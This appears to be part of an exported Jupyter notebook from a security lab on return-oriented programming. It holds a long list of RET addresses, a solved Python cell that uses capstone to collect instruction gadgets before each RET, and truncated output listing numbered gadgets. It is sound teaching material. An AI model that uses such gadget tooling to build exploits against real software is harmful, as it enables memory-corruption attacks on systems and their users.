# 080bdf1c:	ret
# 080bdf49:	ret
# 080bdf89:	ret
# 080be080:	ret
# 080be234:	ret
# 080be250:	ret
# 080be281:	ret
# 080be2e7:	ret
# 080be2f1:	ret
# 080be482:	ret
# 080be656:	ret
# 080be724:	ret
# 080bea8b:	ret
# 080beaa5:	ret
# 080bead0:	ret
# 080beaed:	ret
# 080beafe:	ret
# 080beb4d:	ret
# 080beb66:	ret
# 080bebbb:	ret
# 080bec91:	ret
# 080becb6:	ret
# 080beceb:	ret
# 080bed06:	ret
# 080bede7:	ret
# 080bee0b:	ret
# 080bee59:	ret
# 080bee8b:	ret
# 080beea3:	ret
# 080beee2:	ret
# 080beefb:	ret
# 080bef20:	ret
# 080bef37:	ret
# 080bef4e:	ret
# 080beff3:	ret
# 080bf242:	ret
# 080bf31a:	ret
# 080bf45d:	ret
# 080bf4f9:	ret
# 080bf5a2:	ret
# 080bf621:	ret
# 080bf633:	ret
# 080bf810:	ret
# 080bf81b:	ret
# 080bf9b8:	ret
# 080bfa04:	ret
# 080bfa3b:	ret
# 080bfb1a:	ret
# 080c0001:	ret
# 080c004e:	ret
# 080c0054:	ret
# 080c026b:	ret
# 080c036f:	ret
# 080c03ce:	ret
# 080c049f:	ret
# 080c04ae:	ret
# 080c04b6:	ret
# 080c0507:	ret
# 080c0516:	ret
# 080c051e:	ret
# 080c056d:	ret
# 080c0619:	ret
# 080c076e:	ret
# 080c0940:	ret
# 080c09a6:	ret
# 080c09cb:	ret
# 080c09ea:	ret
# 080c0a03:	ret
# 080c0ab9:	ret
# 080c0b0a:	ret
# 080c0cb7:	ret
# 080c0ec6:	ret
# 080c0eee:	ret
# 080c0f08:	ret
# 080c0f23:	ret
# 080c0ffd:	ret
# 080c1168:	ret
# 080c12de:	ret
# 080c13df:	ret
# 080c1520:	ret
# 080c1573:	ret
# 080c15e3:	ret
# 080c15fa:	ret
# 080c162f:	ret
# 080c1663:	ret
# 080c1700:	ret
# 080c1744:	ret
# 080c175e:	ret
# 080c18b5:	ret
# 080c18d5:	ret
# 080c193b:	ret
# 080c1b5c:	ret
# 080c1bec:	ret
# 080c1c3f:	ret
# 080c1cef:	ret
# 080c1d3e:	ret
# 080c1d4c:	ret
# 080c1d6d:	ret
# 080c1d7c:	ret
# 080c1e17:	ret
# 080c1e2c:	ret
# 080c1e50:	ret
# 080c1e6c:	ret
# 080c1f0f:	ret
# 080c1f2e:	ret
# 080c1fca:	ret
# 080c1fe1:	ret
# 080c1ffa:	ret
# 080c2011:	ret
# 080c2040:	ret
# 080c2053:	ret
# 080c206e:	ret
# 080c20ba:	ret
# 080c22b1:	ret
# 080c2345:	ret
# 080c23a6:	ret
# 080c2500:	ret
# 080c2670:	ret
# 080c27e0:	ret
# 080c2950:	ret
# 080c2ab0:	ret
# 080c2c10:	ret
# 080c2d70:	ret
# 080c2ed0:	ret
# 080c3030:	ret
# 080c3190:	ret
# 080c32f0:	ret
# 080c3450:	ret
# 080c35b0:	ret
# 080c3710:	ret
# 080c3870:	ret
# 080c38f1:	ret
# 080c3934:	ret
# 080c3978:	ret
# 080c39ce:	ret
# 080c3a08:	ret
# 080c3a11:	ret
# 080c3b51:	ret
# 080c3b85:	ret
# 080c3bb7:	ret
# 080c3bf2:	ret
# 080c3c31:	ret
# 080c3c54:	ret
# 080c3c76:	ret
# 080c3c9c:	ret
# 080c3cba:	ret
# 080c3cdc:	ret
# 080c3cfa:	ret
# 080c3d1e:	ret
# 080c3d40:	ret
# 080c3d6e:	ret
# 080c3d92:	ret
# 080c3dc2:	ret
# 080c3df2:	ret
# 080c3e01:	ret
# 080c3e13:	ret
# 080c3e24:	ret
# 080c3e37:	ret
# 080c3e43:	ret
# 080c3e56:	ret
# 080c3e67:	ret
# 080c3e76:	ret
# 080c3e85:	ret
# 080c3e98:	ret
# 080c3ea9:	ret
# 080c3eb8:	ret
# 080c3ec8:	ret
# 080c3eda:	ret
# 080c3eea:	ret
# 080c3efa:	ret
# 080c3f0a:	ret
# 080c3fd8:	ret
# 080c3ffe:	ret
# 080c4033:	ret
# 080c4055:	ret
# 080c407b:	ret
# 080c4093:	ret
# 080c40b9:	ret
# 080c40db:	ret
# 080c40f9:	ret
# 080c4117:	ret
# 080c413d:	ret
# 080c415f:	ret
# 080c417d:	ret
# 080c419d:	ret
# 080c41c1:	ret
# 080c41f1:	ret
# 080c4221:	ret
# 080c4247:	ret
# 080c4255:	ret
# 080c4295:	ret
# 080c450c:	ret
# 080c456a:	ret
# 080c45c8:	ret
# 080c4626:	ret
# 080c468a:	ret
# 080c46ee:	ret
# 080c4754:	ret
# 080c47b8:	ret
# 080c4816:	ret
# 080c4874:	ret
# 080c48d2:	ret
# 080c4932:	ret
# 080c498c:	ret
# 080c49e6:	ret
# 080c4a42:	ret
# 080c4aa3:	ret
# 080c4b18:	ret
# 080c4b6a:	ret
# 080c4be0:	ret
# 080c4c37:	ret
# 080c4cfd:	ret
# 080c4d95:	ret
# 080c4ea1:	ret
# 080c4f58:	ret
# 080c4f7d:	ret
# 080c4fa2:	ret
# 080c5021:	ret
# 080c50a9:	ret
# 080c5133:	ret
# 080c5151:	ret
# 080c5175:	ret
# 080c5198:	ret
# 080c51b3:	ret
# 080c51d6:	ret
# 080c51fb:	ret
# 080c5219:	ret
# 080c5237:	ret
# 080c525a:	ret
# 080c527f:	ret
# 080c529d:	ret
# 080c52bd:	ret
# 080c52e1:	ret
# 080c5311:	ret
# 080c5341:	ret
# 080c5367:	ret
# 080c538a:	ret
# 080c53af:	ret
# 080c53cd:	ret
# 080c53ed:	ret
# 080c5410:	ret
# 080c5441:	ret
# 080c5471:	ret
# 080c54a1:	ret
# 080c54d4:	ret
# 080c5509:	ret
# 080c5537:	ret
# 080c5567:	ret
# 080c5591:	ret
# 080c55c1:	ret
# 080c55f1:	ret
# 080c5621:	ret
# 080c5637:	ret
# 080c5649:	ret
# 080c565f:	ret
# 080c5667:	ret
# 080c567d:	ret
# 080c568f:	ret
# 080c569d:	ret
# 080c56ab:	ret
# 080c56c1:	ret
# 080c56e3:	ret
# 080c5701:	ret
# 080c5721:	ret
# 080c5745:	ret
# 080c5765:	ret
# 080c5785:	ret
# 080c579b:	ret
# 080c57b1:	ret
# 080c57d3:	ret
# 080c57f1:	ret
# 080c5811:	ret
# 080c5837:	ret
# 080c5855:	ret
# 080c5875:	ret
# 080c5895:	ret
# 080c58bb:	ret
# 080c58dd:	ret
# 080c58fb:	ret
# 080c591b:	ret
# 080c5935:	ret
# 080c5955:	ret
# 080c5975:	ret
# 080c5995:	ret
# 080c59bb:	ret
# 080c59c3:	ret
# 080c59d5:	ret
# 080c59e6:	ret
# 080c59f6:	ret
# 080c5a05:	ret
# 080c5a18:	ret
# 080c5a29:	ret
# 080c5a38:	ret
# 080c5a47:	ret
# 080c5a5a:	ret
# 080c5a6b:	ret
# 080c5a7a:	ret
# 080c5a8a:	ret
# 080c5a9c:	ret
# 080c5aac:	ret
# 080c5ab8:	ret
# 080c5ac7:	ret
# 080c5ae4:	ret
# 080c5b2c:	ret
# 080c5b5a:	ret
# 080c5b77:	ret
# 080c5b9b:	ret
# 080c5bd4:	ret
# 080c5beb:	ret
# 080c5c75:	ret
# 080c5cd3:	ret
# 080c5d14:	ret
# 080c5d25:	ret
# 080c5d36:	ret
# 080c5e75:	ret
# 080c5eaf:	ret
# 080c5ed0:	ret
# 080c5f11:	ret
# 080c5f2e:	ret
# 080c5fc2:	ret
# 080c603e:	ret
# 080c603f:	ret
# 080c609b:	ret
# 080c623b:	ret
# 080c624d:	ret
# 080c6391:	ret
# 080c6416:	ret
# 080c64e3:	ret
# 080c64f3:	ret
# 080c6510:	ret
# 080c655f:	ret
# 080c6570:	ret
# 080c7016:	ret
# 080c73df:	ret
# 080c773d:	ret
# 080c7785:	ret
# 080c79d1:	ret
# 080c7a32:	ret
# 080c7acd:	ret
# 080c7bf4:	ret
# 080c7c39:	ret
# 080c7d35:	ret
# 080c7f2e:	ret
# 080c7f31:	ret
# 080c7f65:	ret
# 080c80dd:	ret
# 080c8428:	ret
# 080c8460:	ret
# 080c8509:	ret
# 080c864b:	ret
# 080c874b:	ret
# 080c8793:	ret
# 080c885c:	ret
# 080c88a3:	ret
# 080c88d9:	ret
# 080c8901:	ret
# 080c8944:	ret
# 080c8959:	ret
# 080c89a8:	ret
# 080c89f2:	ret
# 080c8a92:	ret
# 080c8ae6:	ret
# 080c8b27:	ret
# 080c8b93:	ret
# 080c8bf5:	ret
# 080c8c52:	ret
# 080c8e54:	ret
# 080c8eb1:	ret
# 080c8ecd:	ret
# 080c9009:	ret
# 080c902d:	ret
# 080c9079:	ret
# 080c9098:	ret
# 080c90af:	ret
# 080c9167:	ret
# 080c918b:	ret
# 080c919c:	ret
# 080c91b4:	ret
# 080c91cf:	ret
# 080c927d:	ret
# 080c92a4:	ret
# 080c92e9:	ret
# 080c930f:	ret
# 080c9318:	ret
# 080c934c:	ret
# 080c936d:	ret
# 080c9394:	ret
# 080c93dd:	ret
# 080c9404:	ret
# 080c9444:	ret
# 080c948a:	ret
# 080c94b4:	ret
# 080c9502:	ret
# 080c9524:	ret
# 080c9571:	ret
# 080c95a4:	ret
# 080c95c5:	ret
# 080c95ef:	ret
# 080c9623:	ret
# 080c964c:	ret
# 080c967e:	ret
# 080c96a4:	ret
# 080c96dd:	ret
# 080c9707:	ret
# 080c973c:	ret
# 080c9766:	ret
# 080c9784:	ret
# 080c9824:	ret
# 080c987c:	ret
# 080c98c1:	ret
# 080c9a2e:	ret
# 080c9b06:	ret
# 080c9b2e:	ret
# 080c9b7c:	ret
# 080c9c9c:	ret
# 080c9cde:	ret
# 080c9cf1:	ret
# 080c9dcf:	ret
# 080c9dec:	ret
# 080c9e3c:	ret
# 080c9ef0:	ret
# 080c9ffa:	ret
# 080ca007:	ret
# 080ca11c:	ret
# 080ca190:	ret
# 080ca270:	ret
# 080ca2b0:	ret
# 080ca2b9:	ret
# 080ca3da:	ret
# 080ca489:	ret
# 080ca499:	ret
# 080ca4d6:	ret
# 080ca51a:	ret
# 080ca52a:	ret
# 080ca561:	ret
# 080ca5ac:	ret
# 080ca5cc:	ret
# 080ca634:	ret
# 080ca684:	ret
# 080ca6dc:	ret
# 080ca823:	ret
# 080ca8ec:	ret
# 080ca9df:	ret
# 080caa25:	ret
# 080caba2:	ret
# 080cac66:	ret
# 080cacf9:	ret
# 080cad01:	ret
# 080cad1e:	ret
# 080cad4f:	ret
# 080cadfa:	ret
# 080cae10:	ret
# 080cae2c:	ret
# 080caeef:	ret
# 080caf06:	ret
# 080caf1b:	ret
# 080caf58:	ret
# 080caf6b:	ret
# 080cafbf:	ret
# 080cafcb:	ret
# 080cafdb:	ret
# 080caff7:	ret
# 080cb00f:	ret
# 080cb01b:	ret
# 080cb02b:	ret
# 080cb03b:	ret
# 080cb060:	ret
# 080cb07b:	ret
# 080cb08b:	ret
# 080cb15e:	ret
# 080cb16c:	ret
# 080cb174:	ret
# 080cb226:	ret
# 080cb23f:	ret
# 080cb337:	ret
# 080cb450:	ret
# 080cb47d:	ret
# 080cb530:	ret
# 080cb5b1:	ret
# 080cb5db:	ret
# 080cb697:	ret
# 080cb730:	ret
# 080cb747:	ret
# 080cb771:	ret
# 080cb785:	ret
# 080cb7c1:	ret
# 080cb7db:	ret
# 080cb7eb:	ret
# 080cb80a:	ret
# 080cb821:	ret
# 080cb83b:	ret
# 080cb84b:	ret
# 080cb86a:	ret
# 080cb88d:	ret
# 080cb8d9:	ret
# 080cb8f8:	ret
# 080cb90f:	ret
# 080cba35:	ret
# 080cba4e:	ret
# 080cba80:	ret
# 080cbaea:	ret
# 080cbb06:	ret
# 080cbb26:	ret
# 080cbc90:	ret
# 080cbca1:	ret
# 080cbf15:	ret
# 080cbf2c:	ret
# 080cc009:	ret
# 080cc0a9:	ret
# 080cc141:	ret
# 080cc182:	ret
# 080cc256:	ret
# 080cc2c9:	ret
# 080cc372:	ret
# 080cc3a3:	ret
# 080cc4b5:	ret
# 080cc54b:	ret
# 080cc584:	ret
# 080cc62e:	ret
# 080cc707:	ret
# 080cc70e:	ret
# 080cc717:	ret
# 080cc82d:	ret
# 080cca8e:	ret
# 080ccb3b:	ret
# 080ccba8:	ret
# 080ccbf1:	ret
# 080ccc28:	ret
# 080ccc3c:	ret
# 080ccc53:	ret
# 080ccc91:	ret
# 080ccd06:	ret
# 080ccd3b:	ret
# 080ccd4b:	ret
# 080ccd6c:	ret
# 080ccd7e:	ret
# 080cce04:	ret
# 080cce53:	ret
# 080cceab:	ret
# 080ccec1:	ret
# 080ccee0:	ret
# 080ccefe:	ret
# 080ccf88:	ret
# 080cd117:	ret
# 080cd144:	ret
# 080cd15d:	ret
# 080cd174:	ret
# 080cd198:	ret
# 080cd1bd:	ret
# 080cd209:	ret
# 080cd228:	ret
# 080cd23f:	ret
# 080cd334:	ret
# 080cd3a8:	ret
# 080cd401:	ret
# 080cd59f:	ret
# 080cd5b2:	ret
# 080cd6a8:	ret
# 080cd6d1:	ret

# %% [markdown]
# Once you have located all the `RET` instructions, trace back to the instructions prior to the `RET` instructions and print them out. For simplicity, you can assume the specific number of bytes that you will trace back from the `RET` instruction to find the gadget (configured with `MAX_BYTES_PER_GADGET`). For example, you can search up to 16 bytes prior to a `RET` instruction, by disassembling the 16 bytes using capstone. However, you may want to try all the possibilities from 1 to 16 bytes prior to a `RET` instruction, for two reasons:
#
# 1. The 16 bytes prior to the `RET` instruction may not be valid for the disassembler, or the disassembler ended with a faw remaining bytes that cannot be disassembled.
# 2. Even if the 16 bytes can be properly disassembled with no remaining bytes, you would want more combinations of instructions that you can use for the attack.

# %% [markdown]
# Remember: Keep your code flexible regardless of what `MAX_BYTES_PER_GADGET` is. Later, you may need to return to this cell to increase the value of `MAX_BYTES_PER_GADGET` and rerun the scanning to find more gadgets.

# %%
MAX_BYTES_PER_GADGET = 8 # Not counting the RET instruction

# TODO: find all the gadgets and put them into a list.
# Each gadget shall be a list of instructions, ended with RET.
# Optionally, you can ignore repeated gadgets (i.e., sequences that have already showed up).
gadgets = []

scn_sequences = []
for insn in ret_insns:
  scn_addresses = []
  for start_addr in range(insn.address - MAX_BYTES_PER_GADGET, insn.address):
    if start_addr in scn_addresses:
      continue
    sequence = code[start_addr-code_start:insn.address-code_start]
    if sequence in scn_sequences:
      continue
    gadget = list(md.disasm(sequence, start_addr))
    if len(gadget) == 0:
      continue
    scn_addresses += [i.address for i in gadget]
    scn_sequences.append(sequence)
    if gadget[-1].address + gadget[-1].size < insn.address:
      continue
    gadgets.append(gadget+[insn])

# Do not change the code below
print("Print all the gadgets:")
n = 1
for gadget in gadgets:
  print("Gadget #%d:" % n)
  n += 1
  assert len(gadget) > 0
  assert gadget[-1].mnemonic == 'ret'
  addr = gadget[0].address
  for insn in gadget:
    assert insn.address == addr
    addr += insn.size
    print("%08x:\t%s\t%s" % (insn.address, insn.mnemonic, insn.op_str))
# Out:
# Streaming output truncated to the last 5000 lines.
# 080a94a9:	push	es
# 080a94aa:	lea	eax, [edi + eax + 0x30]
# 080a94ae:	pop	edi
# 080a94af:	ret
# Gadget #2207:
# 080a94ab:	inc	esp
# 080a94ac:	pop	es
# 080a94ad:	xor	byte ptr [edi - 0x3d], bl
# 080a94b0:	xor	eax, eax
# 080a94b2:	pop	edi
# 080a94b3:	ret
# Gadget #2208:
# 080a94ae:	pop	edi
# 080a94af:	ret
# 080a94b0:	xor	eax, eax
# 080a94b2:	pop	edi
# 080a94b3:	ret
# Gadget #2209:
# 080a9520:	xor	esi, esi
# 080a9522:	pop	ebx
# 080a9523:	mov	eax, esi
# 080a9525:	pop	esi
# 080a9526:	pop	edi
# 080a9527:	ret
# Gadget #2210:
# 080a9593:	je	0x80a9570
# 080a9595:	pop	ebx
# 080a9596:	mov	eax, ebp
# 080a9598:	pop	esi
# 080a9599:	pop	edi
# 080a959a:	pop	ebp
# 080a959b:	ret
# Gadget #2211:
# 080a95a0:	xor	ebp, ebp
# 080a95a2:	pop	ebx
# 080a95a3:	pop	esi
# 080a95a4:	mov	eax, ebp
# 080a95a6:	pop	edi
# 080a95a7:	pop	ebp
# 080a95a8:	ret
# Gadget #2212:
# 080a95a1:	in	eax, dx
# 080a95a2:	pop	ebx
# 080a95a3:	pop	esi
# 080a95a4:	mov	eax, ebp
# 080a95a6:	pop	edi
# 080a95a7:	pop	ebp
# 080a95a8:	ret
# Gadget #2213:
# 080a9ab3:	adc	byte ptr [esi + 0xf], ah
# 080a9ab6:	outsd	dx, dword ptr [esi]
# 080a9ab7:	fsub	st(1), st(0)
# 080a9ab9:	ret
# Gadget #2214:
# 080a9d06:	outsd	dx, dword ptr [esi]
# 080a9d07:	fsub	st(1), st(0)
# 080a9d09:	ret
# Gadget #2215:
# 080a9f57:	fsub	st(1), st(0)
# 080a9f59:	ret
# Gadget #2216:
# 080aae0b:	dec	byte ptr [ebp - 0x7af00587]
# 080aae11:	ret
# Gadget #2217:
# 080abc55:	inc	eax
# 080abc56:	ljmp	0x5b5d:0xc829fffc
# 080abc5d:	ret
# Gadget #2218:
# 080abc59:	sub	eax, ecx
# 080abc5b:	pop	ebp
# 080abc5c:	pop	ebx
# 080abc5d:	ret
# Gadget #2219:
# 080abc7a:	ljmp	0x5b5d:0xc829fffc
# 080abc81:	ret
# Gadget #2220:
# 080abc7f:	pop	ebp
# 080abc80:	pop	ebx
# 080abc81:	ret
# Gadget #2221:
# 080abe26:	add	dh, bh
# 080abe28:	fadd	dword ptr [ebx + 0x5b5d04c4]
# 080abe2e:	ret
# Gadget #2222:
# 080abe27:	neg	eax
# 080abe29:	add	esp, 4
# 080abe2c:	pop	ebp
# 080abe2d:	pop	ebx
# 080abe2e:	ret
# Gadget #2223:
# 080abe2b:	add	al, 0x5d
# 080abe2d:	pop	ebx
# 080abe2e:	ret
# Gadget #2224:
# 080abe31:	les	eax, ptr [esi + ebx*2]
# 080abe34:	pop	edi
# 080abe35:	pop	ebp
# 080abe36:	pop	ebx
# 080abe37:	xor	eax, eax
# 080abe39:	ret
# Gadget #2225:
# 080abe32:	add	al, 0x5e
# 080abe34:	pop	edi
# 080abe35:	pop	ebp
# 080abe36:	pop	ebx
# 080abe37:	xor	eax, eax
# 080abe39:	ret
# Gadget #2226:
# 080abe33:	pop	esi
# 080abe34:	pop	edi
# 080abe35:	pop	ebp
# 080abe36:	pop	ebx
# 080abe37:	xor	eax, eax
# 080abe39:	ret
# Gadget #2227:
# 080ac0fb:	into
# 080ac0fc:	jne	0x80ac110
# 080ac0fe:	pop	esi
# 080ac0ff:	pop	ebp
# 080ac100:	pop	ebx
# 080ac101:	xor	eax, eax
# 080ac103:	ret
# Gadget #2228:
# 080ac0fd:	adc	bl, byte ptr [esi + 0x5d]
# 080ac100:	pop	ebx
# 080ac101:	xor	eax, eax
# 080ac103:	ret
# Gadget #2229:
# 080ac119:	dec	dword ptr [edi]
# 080ac11b:	inc	esi
# 080ac11c:	ret	0x5d5e
# 080ac11f:	pop	ebx
# 080ac120:	ret
# Gadget #2230:
# 080ac11a:	cmovbe	eax, edx
# 080ac11d:	pop	esi
# 080ac11e:	pop	ebp
# 080ac11f:	pop	ebx
# 080ac120:	ret
# Gadget #2231:
# 080ac4cd:	cld
# 080ac4ce:	jmp	ptr [ecx]
# 080ac4d0:	enter	0x5f5e, 0x5d
# 080ac4d4:	pop	ebx
# 080ac4d5:	ret
# Gadget #2232:
# 080ac4cf:	sub	eax, ecx
# 080ac4d1:	pop	esi
# 080ac4d2:	pop	edi
# 080ac4d3:	pop	ebp
# 080ac4d4:	pop	ebx
# 080ac4d5:	ret
# Gadget #2233:
# 080ac4de:	jbe	0x80ac4e0
# 080ac4e0:	pop	esi
# 080ac4e1:	xor	eax, eax
# 080ac4e3:	pop	edi
# 080ac4e4:	pop	ebp
# 080ac4e5:	pop	ebx
# 080ac4e6:	ret
# Gadget #2234:
# 080ac4df:	add	byte ptr [esi + 0x31], bl
# 080ac4e2:	rcr	byte ptr [edi + 0x5d], 0x5b
# 080ac4e6:	ret
# Gadget #2235:
# 080ac4f4:	add	byte ptr [edi + 2], dh
# 080ac4f7:	neg	eax
# 080ac4f9:	pop	edi
# 080ac4fa:	pop	ebp
# 080ac4fb:	pop	ebx
# 080ac4fc:	ret
# Gadget #2236:
# 080ac4f5:	ja	0x80ac4f9
# 080ac4f7:	neg	eax
# 080ac4f9:	pop	edi
# 080ac4fa:	pop	ebp
# 080ac4fb:	pop	ebx
# 080ac4fc:	ret
# Gadget #2237:
# 080ac4f6:	add	dh, bh
# 080ac4f8:	fcomp	dword ptr [edi + 0x5d]
# 080ac4fb:	pop	ebx
# 080ac4fc:	ret
# Gadget #2238:
# 080ac51a:	std
# 080ac51b:	add	al, 0x76
# 080ac51d:	ret
# Gadget #2239:
# 080ac75d:	xchg	edi, eax
# 080ac75e:	add	byte ptr [eax], al
# 080ac760:	add	byte ptr [ebx + 0x5e], bl
# 080ac763:	pop	edi
# 080ac764:	pop	ebp
# 080ac765:	ret
# Gadget #2240:
# 080ac797:	outsd	dx, dword ptr [esi]
# 080ac798:	ret
# Gadget #2241:
# 080ac7bf:	call	ptr [ebx + 0x31]
# 080ac7c2:	rcr	byte ptr [esi + 0x5f], 0x5d
# 080ac7c6:	ret
# Gadget #2242:
# 080ac7c0:	pop	ebx
# 080ac7c1:	xor	eax, eax
# 080ac7c3:	pop	esi
# 080ac7c4:	pop	edi
# 080ac7c5:	pop	ebp
# 080ac7c6:	ret
# Gadget #2243:
# 080ac7eb:	add	eax, ecx
# 080ac7ed:	pop	ebx
# 080ac7ee:	pop	esi
# 080ac7ef:	sub	eax, edx
# 080ac7f1:	pop	edi
# 080ac7f2:	pop	ebp
# 080ac7f3:	ret
# Gadget #2244:
# 080ac7ec:	enter	0x5e5b, 0x29
# 080ac7f0:	rcr	byte ptr [edi + 0x5d], 1
# 080ac7f3:	ret
# Gadget #2245:
# 080ac9b2:	add	bh, bh
# 080ac9b4:	add	byte ptr [ecx + eax + 0x40], dh
# 080ac9b8:	pop	edi
# 080ac9b9:	pop	esi
# 080ac9ba:	ret
# Gadget #2246:
# 080ac9b3:	inc	dword ptr [eax]
# 080ac9b5:	je	0x80ac9b8
# 080ac9b7:	inc	eax
# 080ac9b8:	pop	edi
# 080ac9b9:	pop	esi
# 080ac9ba:	ret
# Gadget #2247:
# 080ac9b6:	add	dword ptr [eax + 0x5f], eax
# 080ac9b9:	pop	esi
# 080ac9ba:	ret
# Gadget #2248:
# 080acb74:	into
# 080acb75:	jne	0x80acb7a
# 080acb77:	lea	eax, [esi + 3]
# 080acb7a:	pop	esi
# 080acb7b:	pop	edi
# 080acb7c:	ret
# Gadget #2249:
# 080acb76:	add	ecx, dword ptr [ebp + 0x5f5e0346]
# 080acb7c:	ret
# Gadget #2250:
# 080acb78:	inc	esi
# 080acb79:	add	ebx, dword ptr [esi + 0x5f]
# 080acb7c:	ret
# Gadget #2251:
# 080acc2d:	add	byte ptr [eax], al
# 080acc2f:	sub	eax, edx
# 080acc31:	ret
# Gadget #2252:
# 080acc4c:	mov	dword ptr [0xc7530005], eax
# 080acc51:	ret
# Gadget #2253:
# 080acc66:	pop	ebx
# 080acc67:	cmovne	eax, ecx
# 080acc6a:	ret
# Gadget #2254:
# 080accad:	loop	0x80acc38
# 080accaf:	ret
# Gadget #2255:
# 080accab:	adc	byte ptr [ebp - 0x1e], dh
# 080accae:	mov	ebx, eax
# 080accb0:	mov	eax, ebx
# 080accb2:	pop	ebx
# 080accb3:	ret
# Gadget #2256:
# 080accac:	jne	0x80acc90
# 080accae:	mov	ebx, eax
# 080accb0:	mov	eax, ebx
# 080accb2:	pop	ebx
# 080accb3:	ret
# Gadget #2257:
# 080accad:	loop	0x80acc38
# 080accaf:	ret
# 080accb0:	mov	eax, ebx
# 080accb2:	pop	ebx
# 080accb3:	ret
# Gadget #2258:
# 080accb7:	add	byte ptr [ecx], dh
# 080accb9:	fild	dword ptr [ebp - 0x760d8b37]
# 080accbf:	ret
# Gadget #2259:
# 080accd8:	jne	0x80accb0
# 080accda:	lea	ebx, [eax + 8]
# 080accdd:	mov	eax, ebx
# 080accdf:	pop	ebx
# 080acce0:	ret
# Gadget #2260:
# 080accd9:	salc
# 080accda:	lea	ebx, [eax + 8]
# 080accdd:	mov	eax, ebx
# 080accdf:	pop	ebx
# 080acce0:	ret
# Gadget #2261:
# 080acce6:	add	byte ptr [eax], al
# 080acce8:	lea	ebx, [eax + 4]
# 080acceb:	mov	eax, ebx
# 080acced:	pop	ebx
# 080accee:	ret
# Gadget #2262:
# 080acce7:	add	byte ptr [ebp - 0x2776fba8], cl
# 080acced:	pop	ebx
# 080accee:	ret
# Gadget #2263:
# 080accee:	ret
# 080accef:	nop
# 080accf0:	lea	ebx, [eax + 0xc]
# 080accf3:	mov	eax, ebx
# 080accf5:	pop	ebx
# 080accf6:	ret
# Gadget #2264:
# 080acdb8:	je	0x80acdc0
# 080acdba:	mov	eax, esi
# 080acdbc:	pop	ebx
# 080acdbd:	pop	esi
# 080acdbe:	ret
# Gadget #2265:
# 080acdb9:	push	es
# 080acdba:	mov	eax, esi
# 080acdbc:	pop	ebx
# 080acdbd:	pop	esi
# 080acdbe:	ret
# Gadget #2266:
# 080acdbf:	nop
# 080acdc0:	mov	dword ptr [eax + 8], edx
# 080acdc3:	mov	eax, esi
# 080acdc5:	pop	ebx
# 080acdc6:	pop	esi
# 080acdc7:	ret
# Gadget #2267:
# 080ad0c1:	jl	0x80ad046
# 080ad0c3:	les	ecx, ptr [ebx + ebx*2 + 0x5e]
# 080ad0c7:	pop	edi
# 080ad0c8:	pop	ebp
# 080ad0c9:	ret
# Gadget #2268:
# 080ad19e:	cmp	edx, ecx
# 080ad1a0:	je	0x80ad1a6
# 080ad1a2:	test	edx, edx
# 080ad1a4:	jne	0x80ad198
# 080ad1a6:	ret
# Gadget #2269:
# 080ad19f:	retf	0x474
# 080ad1a2:	test	edx, edx
# 080ad1a4:	jne	0x80ad198
# 080ad1a6:	ret
# Gadget #2270:
# 080ad1a1:	add	al, 0x85
# 080ad1a3:	sal	byte ptr [ebp - 0xe], cl
# 080ad1a6:	ret
# Gadget #2271:
# 080ad2e8:	pop	ss
# 080ad2e9:	mov	cl, dl
# 080ad2eb:	and	cl, 0xf
# 080ad2ee:	je	0x80ad310
# 080ad2f0:	ret
# Gadget #2272:
# 080ad2ea:	rol	dword ptr [eax + 0x20740fe1], 1
# 080ad2f0:	ret
# Gadget #2273:
# 080ad2ec:	loope	0x80ad2fd
# 080ad2ee:	je	0x80ad310
# 080ad2f0:	ret
# Gadget #2274:
# 080ad2ed:	pcmpeqb	mm4, qword ptr [eax]
# 080ad2f0:	ret
# Gadget #2275:
# 080ad302:	and	ch, 0xf
# 080ad305:	je	0x80ad320
# 080ad307:	add	eax, 2
# 080ad30a:	ret
# Gadget #2276:
# 080ad303:	in	eax, 0xf
# 080ad305:	je	0x80ad320
# 080ad307:	add	eax, 2
# 080ad30a:	ret
# Gadget #2277:
# 080ad304:	pcmpeqb	mm3, qword ptr [ecx]
# 080ad307:	add	eax, 2
# 080ad30a:	ret
# Gadget #2278:
# 080ad30b:	lea	esi, [esi]
# 080ad30f:	nop
# 080ad310:	add	eax, 1
# 080ad313:	ret
# Gadget #2279:
# 080ad31b:	lea	esi, [esi]
# 080ad31f:	nop
# 080ad320:	add	eax, 3
# 080ad323:	ret
# Gadget #2280:
# 080ad32f:	nop
# 080ad330:	xor	eax, eax
# 080ad332:	ret
# Gadget #2281:
# 080ad33d:	add	byte ptr [eax], al
# 080ad33f:	add	byte ptr [eax + 1], bh
# 080ad345:	ret
# Gadget #2282:
# 080ad33e:	add	byte ptr [eax], al
# 080ad340:	mov	eax, 1
# 080ad345:	ret
# Gadget #2283:
# 080ad341:	add	dword ptr [eax], eax
# 080ad343:	add	byte ptr [eax], al
# 080ad345:	ret
# Gadget #2284:
# 080ad34d:	lea	esi, [esi]
# 080ad350:	mov	eax, 2
# 080ad355:	ret
# Gadget #2285:
# 080ad34e:	jbe	0x80ad350
# 080ad350:	mov	eax, 2
# 080ad355:	ret
# Gadget #2286:
# 080ad34f:	add	byte ptr [eax + 2], bh
# 080ad355:	ret
# Gadget #2287:
# 080ad351:	add	al, byte ptr [eax]
# 080ad353:	add	byte ptr [eax], al
# 080ad355:	ret
# Gadget #2288:
# 080ad35d:	lea	esi, [esi]
# 080ad360:	mov	eax, 3
# 080ad365:	ret
# Gadget #2289:
# 080ad35e:	jbe	0x80ad360
# 080ad360:	mov	eax, 3
# 080ad365:	ret
# Gadget #2290:
# 080ad35f:	add	byte ptr [eax + 3], bh
# 080ad365:	ret
# Gadget #2291:
# 080ad361:	add	eax, dword ptr [eax]
# 080ad363:	add	byte ptr [eax], al
# 080ad365:	ret
# Gadget #2292:
# 080ad36d:	lea	esi, [esi]
# 080ad370:	mov	eax, 4
# 080ad375:	ret
# Gadget #2293:
# 080ad36e:	jbe	0x80ad370
# 080ad370:	mov	eax, 4
# 080ad375:	ret
# Gadget #2294:
# 080ad36f:	add	byte ptr [eax + 4], bh
# 080ad375:	ret
# Gadget #2295:
# 080ad371:	add	al, 0
# 080ad373:	add	byte ptr [eax], al
# 080ad375:	ret
# Gadget #2296:
# 080ad37d:	lea	esi, [esi]
# 080ad380:	mov	eax, 5
# 080ad385:	ret
# Gadget #2297:
# 080ad37e:	jbe	0x80ad380
# 080ad380:	mov	eax, 5
# 080ad385:	ret
# Gadget #2298:
# 080ad37f:	add	byte ptr [eax + 5], bh
# 080ad385:	ret
# Gadget #2299:
# 080ad38d:	lea	esi, [esi]
# 080ad390:	mov	eax, 6
# 080ad395:	ret
# Gadget #2300:
# 080ad38e:	jbe	0x80ad390
